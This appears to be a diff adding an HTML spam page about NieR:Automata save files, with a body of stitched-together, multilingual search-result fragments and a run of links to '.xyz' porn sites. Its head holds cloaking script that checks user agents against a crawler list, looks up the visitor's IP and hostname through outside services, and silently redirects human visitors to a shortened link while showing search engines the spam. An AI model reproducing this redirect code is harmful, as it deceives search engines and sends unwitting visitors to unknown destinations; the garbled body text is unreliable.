@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>5572</title>
+</script>
+</head>
+<body>
+<h1>니어 오토마타 세이브</h1>
+<p>17-Jul-2021 — https://github.com/Idearum/NieRAutomata-SteamID64-Editor/releases/tag/v1.0. 첨부파일. pc니어오토마타-세이브-사용법.zip.12-Apr-2021 — Punt ㅇㅇ 우주선으로 기지 들어가서 보스같은거 하나잡고 또 존나 큰 로봇 보스 잡았는데 비슷한 남자애가 주인공 도와주려다가 죽어서 걔 기계타고 ...06-Aug-2021 — 보스 깨야만 세이브 되나요? 그리고 계속 챕터1 톱니2개에서 죽는데 ㅠㅠ 다시 시작할때 비행기 나오는 그거 넘어가는방법은 없나요?니어:오토마타를 하다보면...이 게임에는 오토세이브 기능이 없으니 세이브방법은 게임내에서 찾아보라는 메시지가. 나타납니다.21-Jul-2021 — 일단 문서-My Games-니어오토마타의 폴더에서 기존 세이브를 백업하시고, 현재 복돌 버전을 실행해서 새로운 세이브를 생성하세요. 거기서 코드를 추출 ...원본 소스https://github.com/CensoredUsername/Nier-Automata-editor수정 ... [PC게임]니어 오토마타 세이브 에디터 수정. 葵つかさ 댓글수 2 조회수 7,845 ...오토마타(automata)는 automaton의 복수형 영단어로, 로봇 혹은 로봇같은 사람을 비유적으로 칭할 때 쓰이는 단어이다.[10] 본 작품의 등장 캐릭터들인 안드로이드(인간의 ...06-Mar-2019 — A work-in-progress tool to edit NieR;Automata save games. Currently allows you to edit the following: Your username; The amount of money you ...니어 오토마타. 마이너. 설정 연관 글쓰기 · ㅇㅇ(112.147); 2021.09.26 01:00. 조회수 1106; 추천 1; 댓글 0 · ㅇㅇ(112.147); 2021.09.26 01:00.Görünürlük: Sadece Arkadaşlar. Bu öğe aramalarda sadece size, arkadaşlarınıza ve yöneticilere görünür olacak. 니어 오토마타 E 엔딩 (세이브 삭제).21-Feb-2021 — 진짜로 세이브 다 날라가는군요. 진짜일줄은 몰랐는데... OTL... 그래도 뭐 A2, 2B 9S 다시 살아나는듯한 나름 해피엔딩이어서 기분은 괜찮네요.NieR:Automata (니어:오토마타) [세이브 파일]. 봇치게이머 2021. 4. 20. 17:24. 게임 진행 내역. 100% ...15-Oct-2018 — 이걸 다시해야하나 고민하다가... 플레이타임이 64시간이네요...하하... 살다살다 세이브파일을 지워버리는 게임은 진짜 처음이네.니어:오토마타(NieR:Automata) 세이브파일 날아가는 영상 تحميل ومشاهدة على الإنترنت مجانا.25-Oct-2022 — 세이브 관련. 일부 체크 포인트를 제외하면 자동 저장이 없습니다. 게임 중간 중간 저장을 하도록 합시다. 특히 처음 시작 ...09-May-2017 — 다른 세이브 파일은 안 건드릴 줄 알았는데 하...마지막 맨트를 다른 사람에게 한다고 ㅋㅋㅋㅋㅋ 하면서 했는데. 저한테 했네요??03-Jan-2021 — 플래티넘게임즈의 액션 RPG '니어:오토마타(NieR:Automata)'에 꼭꼭 숨겨져 있던 '최후의 비밀'이 게임 정식 출시 후 약 3년 10개월 만에 밝혀졌다.세이브 - 니어 오토마타. 全体公開 4461文字. 2017-07-02 01:48:17. 21O와 9S와 2B의 이야기. Posted by @patternsayaka. 文字. フォント; 明朝; ゴシック; 文字サイズ ...13-Jun-2021 — 니어 오토마타 첫보스에서 사망했더니 세이브도 없이 첨부터 다시 실화냐... 아야 네오에서 최저옵으로 잘돌아감. Translate Tweet.12-Nov-2017 — 니어 오토마타를 플레이할 손가락이 안되서, 이지 모드로 떨어트려봤습니다. ... 세이브가 나오기 전에 보스는 그런거 없이도 깨놨는데, ...17-Nov-2020 — ... 등에 관한 스포일러성 내용이 있을 수 있음 니어: 오토마타(이하 오토마타) ... 최종 엔딩을 보고나면 여태까지 플레이한 세이브 파일을 삭제하는 ...07-Jun-2017 — 우선 니어 오토마타 자폭하기 방법은 매우 쉽습니다.단축키만 알면 됩니다. 하지만 문제는 바로 세이브 하는 방법 인데요.니어 오토마타를 제작 할때 ...03-Jul-2017 — 니어 오토마타 존망겜 ㅡㅡ. 프롤로그 동안은 세이브 안된다는거 모르고 프롤로그 보스전 뒤짐. 다시 보스전인가 하고 했더니 오잉 세이브가 없네 뉴 ...6 days ago — 토렌트로 3시간하고 겜삿는데 세이브 못옮김? - 니어 오토마타 14:55 42); 2017 니어 오토마타 nier automata 0 4 Nier : Automata(니어 오토마타) 4K,UHD ...30-Apr-2017 — 166플레이 방송 보니까 퀵세이브 포인트가 있던 모양이던데요. A.Ethier2017-04-30 01:31IP: 115.161.*.18저장하기가 비활성화 되어있는데 이거 1장 ...6 days ago — 무기 니어 추천 오토마타. 추천: 0; [잡담] 니어 오토마타 세이브파일좀 주실분; 공략/팁 2B 팬티만 입고 다니는 방법 겜진행 ...3 days ago — 뿌잉뿌요 니어 오토마타 게임 오브 더 요르하 에디션 한글패치 PC 스팀 ... Automata) 토렌트 다운로드 토렌트로 3시간하고 겜삿는데 세이브 못옮김?39 minutes ago — 이걸로 세이브 파일 다른 곳에 백업했다가 다시 되돌아가서 할 수도 있음 파일 경로는 ... 니어:오토마타(NieR:Automata) 세이브파일 날아가는 영상.60 minutes ago — 니어 오토마타 FAR Mod 로 완벽패치 한글패치 스케일 프레임제한 144hz ... 니어 오토마타 호불호가 심한 이유는 리뷰 · 니어 오토마타 E엔딩 세이브 ...6 hours ago — 니어오토마타 스팀 클라우드에 세이브 저장됨?전에 어떤 중붕이가 안된다 그랬는데 찾아보니까 된다 그러네.예전에 그린 니어오토마타2B 입니다.8 hours ago — 니어 오토마타 토렌트 10 mai 2019 — 니어 오토마타 올인원패치된거 시드 ... [직공 한글무설치] 니어 오토마타(최적화)+엔딩분기점 세이브파일+OST + ...전작에 니어 오토마타 결말 니어 오토마타 결말 ·니어:오토마타는 니어 레플리칸트 ... 세이브파일 백업하고 E엔딩 본다음에 세이브 날아간 폴더에 다시 덮어씌우면 .7 hours ago — 니어 오토마타 사양 오토마타(automata)는 automaton의 복수형 영단어로, ... 저는컴사양이안되서 피방에서하는데 이 세이브파일위치를 몰라서 …파이널 판타지 15 리뷰 (스포X) 니어 오토마타 이후로 간만에 스토리 게임을 ... 자료에 이어서 받으면 세이브 연동이 안될 수도 있습니다 ·디시디아 파이널 판타지 가 ...12 hours ago — 아스트로니어 플라스틱 3 sept. ... 저장 방식도 클라우드 서비스가 아닌 로컬이다 보니 세이브 파일이 잘못 되면 ... 니어 오토마타 자폭 스위치.17 hours ago — 니어 오토마타 e엔딩 세이브 파일. ... 니어 코스프레Xsmt thứ 7 mb city council city hall las vegas 노트북 한영키 전환 안될때 Adsp 정리 pdf ...42 minutes ago — ... 던파 박제 확인 홍진희 누드 - none 디아 세이브 파일 - 디아 세이브 ... Rank eq 함수 - rank eq 함수 니어 오토마타 ver1 1a 수원역 오피스텔 ...7 hours ago — 니어 오토마타 e엔딩 세이브 파일. 아이오아이 정채연 나이. 큐넷 군경력증명서 제출방법. 기룡이 가재맨 고백. 올스타전 김연경. 인턴 중도퇴사.10 hours ago — ... 아래 파일을 받자) 세이브 &amp; 신규 장수 등록 위치 : 내 문서 - (Koei) 폴더 ... 시카고 영화 자막자료실니어 오토마타 dlc 발동상 2023 년 이미지 ...니어 오토마타 애니메이션 PV. ... 5 로얄 버전 조합표; 소감) 101시간 걸려서 엔딩 봤네요; 엑박패스 세이브 스팀에서 불러오기; 페르소나5 로얄 스위치 라이트 소감.Kbo 포스트 시즌 역대 최연소 세이브. 용수철 저울 실험. 대학원 자소서 경력. ... 니어 오토마타 애니 - 니어 오토마타 애니. 리스 제임스 월드컵.... 승강장 배경화면 주 토피아 야동 - 주 토피아 야동 세이브 위자드 라이센스 키 ... torrent 큐브 엔터테인먼트 연습생 니어 오토마타 신사 모드 - 니어 오토마타 ...8 hours ago — 데스스트랜딩 디렉터스 컷 세이브. ... 최케빈로블록스원피스니어 오토마타 키보드 세팅 폴로 가디건 남자 Clube da evangelização da canção nova da ...11 hours ago — ... رسمات ورد د بالوان مائية · 니어 오토마타 성 에서 보물 찾기 · Netsport9 ... 태합 입지전 5 세이브 파일 · Monster hunter world iceborne buy ...11 hours ago — ... 월에는 DLC를 포함한 《니어 오토마타 GOTY 에디션》이 발매되었다.acum 14 ... 최대 명예 레벨의 레드 데드 리뎀션 2 세이브 파일입니다.11 nov.... 젤다 dlc 세이브파일 다음팟 플레이어 64비트 고화질 앨범 아트 - 고화질 앨범 ... 양양공항 영화 우리효과 모음 니어오토마타 dlc 다운로드 Daredevil 영화 다시 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
